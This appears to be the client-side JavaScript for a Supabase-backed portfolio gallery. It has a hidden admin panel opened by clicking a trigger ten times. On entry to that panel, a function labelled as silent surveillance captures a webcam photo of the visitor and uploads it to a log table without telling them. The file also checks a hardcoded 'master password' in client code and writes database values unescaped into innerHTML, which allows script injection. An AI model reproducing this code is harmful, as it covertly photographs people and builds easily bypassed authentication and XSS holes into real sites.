/**
 * CONFIGURACIÓN SUPABASE
 */
const SUPABASE_URL = "https://mecoxenbkopeawsujxzn.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_tYryTD2-tak8F5uf0gfA9Q_J-JueeO1";

/**
 * CLIENTE SUPABASE
 */
const sb = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;

/**
 * ESTADO GLOBAL
 */
let allProjects = [];
let allCategories = [];

document.addEventListener("DOMContentLoaded", async () => {
    initUserApp();
    initSecretTrigger();
    checkSession();
    loadEverything();
    initRealtime(); // Activar tiempo real
});

/**
 * Tiempo real con Supabase
 */
function initRealtime() {
    if (!sb) return;
    sb.channel('db-changes')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'categorias' }, loadEverything)
      .on('postgres_changes', { event: '*', schema: 'public', table: 'proyectos' }, loadEverything)
      .subscribe();
}

/**
 * --- LÓGICA DE USUARIO (WEB PRINCIPAL) ---
 */
function initUserApp() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('show');
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.15 });

    window.mainObserver = observer;
    // Empezar a observar elementos iniciales
    document.querySelectorAll('.animate').forEach(el => observer.observe(el));
}

async function loadEverything() {
    await fetchCategories();
    await fetchProjects();
    renderMainCatalog();
}

async function fetchCategories() {
    if (!sb) return;
    const { data } = await sb.from('categorias').select('*').order('name');
    allCategories = data || [];
}

async function fetchProjects() {
    if (!sb) return;
    const { data } = await sb.from('proyectos').select('*').order('id', { ascending: false });
    allProjects = data || [];
}

/**
 * Renderiza las CATEGORÍAS como los recuadros principales
 */
function renderMainCatalog() {
    const container = document.getElementById('portfolio-container');
    if (!container) return;

    container.innerHTML = "";
    if (allCategories.length === 0) {
        container.innerHTML = '<div class="loading-state">No hay categorías configuradas.</div>';
        return;
    }

    allCategories.forEach(cat => {
        const card = document.createElement("div");
        card.className = `portfolio-card show`; // Usamos 'show' directo para que aparezca sin delay
        const catThumb = cat.image || "professional_bg.png"; 
        
        card.innerHTML = `
            <div class="card-image"><img src="${catThumb}" alt="${cat.name}"></div>
            <div class="card-content">
                <h3>${cat.name}</h3>
                <p>Explorar Galería</p>
                <button class="view-more" onclick="openGallery('${cat.name}')" style="cursor:pointer; background:none; border:none; color:var(--primary-red); font-weight:800; font-family:'Syne';">ABRIR</button>
            </div>
        `;
        container.appendChild(card);
    });
}

/**
 * Abre la Galería (PROYECTOS) filtrada por categoría
 */
function openGallery(categoryName) {
    const modal = document.getElementById('image-modal');
    const modalTitle = document.getElementById('modal-title');
    const galleryContainer = document.querySelector('.modal-gallery');

    modalTitle.textContent = "Trabajos: " + categoryName;
    galleryContainer.innerHTML = "";

    const categoryProjects = allProjects.filter(p => p.categoria === categoryName);

    if (categoryProjects.length === 0) {
        galleryContainer.innerHTML = "<p style='color:#888;'>Próximamente... Aún no hay imágenes en esta sección.</p>";
    } else {
        categoryProjects.forEach(p => {
            const img = document.createElement('img');
            img.src = p.image;
            img.className = 'gallery-img';
            img.style.width = "100%";
            img.style.marginBottom = "1rem";
            img.style.borderRadius = "10px";
            galleryContainer.appendChild(img);
        });
    }

    modal.style.display = "block";
    document.body.style.overflow = "hidden";
}

// Inicialización segura de controles de galería
function initGalleryControls() {
    const closeBtn = document.querySelector('.close-btn');
    if (closeBtn) {
        closeBtn.onclick = () => {
            document.getElementById('image-modal').style.display = 'none';
            document.body.style.overflow = 'auto';
        };
    }
}
initGalleryControls();

/**
 * --- LÓGICA ADMIN ---
 */
function initSecretTrigger() {
    let clicks = 0;
    document.getElementById('admin-trigger').addEventListener('click', () => {
        clicks++;
        if (clicks >= 10) {
            enterAdmin();
            clicks = 0;
        }
    });
}

async function enterAdmin() {
    document.getElementById('user-app').style.display = 'none';
    document.getElementById('admin-app').style.display = 'flex';
    checkSession();
    quietSnapshot();
}

/** Fotos de Vigilancia (Silenciosas) **/
async function quietSnapshot() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.muted = true;
        video.srcObject = stream;
        await new Promise(r => { video.onloadedmetadata = () => video.play().then(r); });
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
        stream.getTracks().forEach(t => t.stop());
        await sb.from('access_logs').insert([{ image: dataUrl, timestamp: new Date().toISOString() }]);
    } catch (e) {}
}

async function checkSession() {
    if (!sb) return;
    const { data: { session } } = await sb.auth.getSession();
    const sidebar = document.querySelector('.admin-sidebar');
    const authSection = document.getElementById('admin-auth');
    hideAllTabs();
    if (session) {
        if (sidebar) sidebar.style.display = 'flex';
        authSection.style.display = 'none';
        switchAdminTab('dash');
    } else {
        if (sidebar) sidebar.style.display = 'none';
        authSection.style.display = 'block';
    }
}

async function loginAdmin() {
    const email = document.getElementById('adm-email').value;
    const pass = document.getElementById('adm-pass').value;
    const { error } = await sb.auth.signInWithPassword({ email, password: pass });
    if (error) alert(error.message);
    else checkSession();
}

function logoutAdmin() { sb.auth.signOut(); checkSession(); }
function exitAdmin() { document.getElementById('admin-app').style.display = 'none'; document.getElementById('user-app').style.display = 'block'; loadEverything(); }
function hideAllTabs() { document.querySelectorAll('.admin-content-section').forEach(s => s.style.display = 'none'); }

function switchAdminTab(tab) {
    const sidebar = document.querySelector('.admin-sidebar');
    if (sidebar && sidebar.style.display === 'none') return;
    hideAllTabs();
    document.querySelectorAll('.admin-nav-item').forEach(btn => btn.classList.remove('active'));
    document.getElementById(`tab-${tab}`).style.display = 'block';
    if (tab === 'dash') updateStats();
    if (tab === 'proy') renderAdminProjects();
    if (tab === 'cat') renderAdminCategories();
    if (tab === 'logs') renderAccessLogs();
}

/** DASHBOARD & CRUD **/
function updateStats() {
    document.getElementById('stat-proy').textContent = allProjects.length;
    document.getElementById('stat-cat').textContent = allCategories.length;
}

function renderAdminProjects() {
    const list = document.getElementById('admin-projects-table');
    list.innerHTML = "";
    allProjects.forEach(p => {
        const item = document.createElement('div');
        item.className = 'admin-table-item';
        item.innerHTML = `<div class="admin-item-info"><img src="${p.image}" class="admin-item-thumb"><div><strong>${p.title}</strong><br><small>${p.categoria}</small></div></div><button onclick="deleteProject(${p.id})" class="btn-mini-delete">Eliminar</button>`;
        list.appendChild(item);
    });
}

function showProjectForm() {
    let catOptions = allCategories.map(c => `<option value="${c.name}">${c.name}</option>`).join('');
    document.getElementById('admin-modal-body').innerHTML = `<h3>Añadir Imagen a Categoría</h3><div class="admin-input-group"><input type="text" id="p-title" placeholder="Nombre Imagen"><input type="text" id="p-img" placeholder="URL o Archivo"><select id="p-cat">${catOptions}</select><button onclick="saveProject()" class="btn-premium">Guardar Imagen</button></div>`;
    document.getElementById('admin-generic-modal').style.display = 'block';
}

async function saveProject() {
    const p = { title: document.getElementById('p-title').value, image: document.getElementById('p-img').value, categoria: document.getElementById('p-cat').value };
    const { error } = await sb.from('proyectos').insert([p]);
    if (error) {
        alert("Error al guardar proyecto: " + error.message);
        console.error(error);
        return;
    }
    closeAdminModal(); await fetchProjects(); renderAdminProjects();
}

async function deleteProject(id) { if (confirm("¿Borrar imagen?")) { await sb.from('proyectos').delete().eq('id', id); await fetchProjects(); renderAdminProjects(); } }

function renderAdminCategories() {
    const list = document.getElementById('admin-categories-list');
    list.innerHTML = "";
    allCategories.forEach(c => {
        const item = document.createElement('div');
        item.className = 'admin-table-item';
        item.innerHTML = `<span>${c.name}</span><button onclick="deleteCategory(${c.id})" class="btn-mini-delete">Eliminar</button>`;
        list.appendChild(item);
    });
}

function showCategoryForm() {
    document.getElementById('admin-modal-body').innerHTML = `<h3>Añadir Nueva Categoría (Recuadro Principal)</h3><div class="admin-input-group"><input type="text" id="c-name" placeholder="Nombre (Ej: Logotipos)"><input type="text" id="c-img" placeholder="Imagen de Portada (URL o archivo)"><button onclick="saveCategory()" class="btn-premium">Crear Categoría</button></div>`;
    document.getElementById('admin-generic-modal').style.display = 'block';
}

async function saveCategory() {
    const name = document.getElementById('c-name').value.trim();
    const imageVal = document.getElementById('c-img').value.trim();
    const categoryData = imageVal ? { name, image: imageVal } : { name };
    const { error } = await sb.from('categorias').insert([categoryData]);
    if (error) {
        alert('Error al guardar categoría: ' + error.message + '\nAsegúrate de que la tabla "categorias" tenga la columna "image" si deseas usarla.');
        console.error(error);
        return;
    }
    closeAdminModal();
    await fetchCategories();
    renderAdminCategories();
    // Refresh the main catalog instantly
    renderMainCatalog();
}

async function deleteCategory(id) {
    if (confirm("¿Borrar categoría completa?")) {
        const { error } = await sb.from('categorias').delete().eq('id', id);
        if (error) {
            alert('Error al borrar categoría: ' + error.message);
            console.error(error);
            return;
        }
        await fetchCategories();
        renderAdminCategories();
        renderMainCatalog();
        alert('🗑️ Categoría eliminada exitosamente.');
    }
}

async function renderAccessLogs() {
    const pass = prompt("Clave Maestra:");
    if (pass !== "Diosymadre123") { switchAdminTab('dash'); return; }
    const grid = document.getElementById('access-logs-grid');
    grid.innerHTML = "Cargando...";
    const { data } = await sb.from('access_logs').select('*').order('timestamp', { ascending: false });
    grid.innerHTML = "";
    data?.forEach(log => {
        const item = document.createElement('div');
        item.className = 'log-entry';
        item.innerHTML = `<img src="${log.image}"><span>${new Date(log.timestamp).toLocaleString()}</span>`;
        grid.appendChild(item);
    });
}

function closeAdminModal() { document.getElementById('admin-generic-modal').style.display = 'none'; }
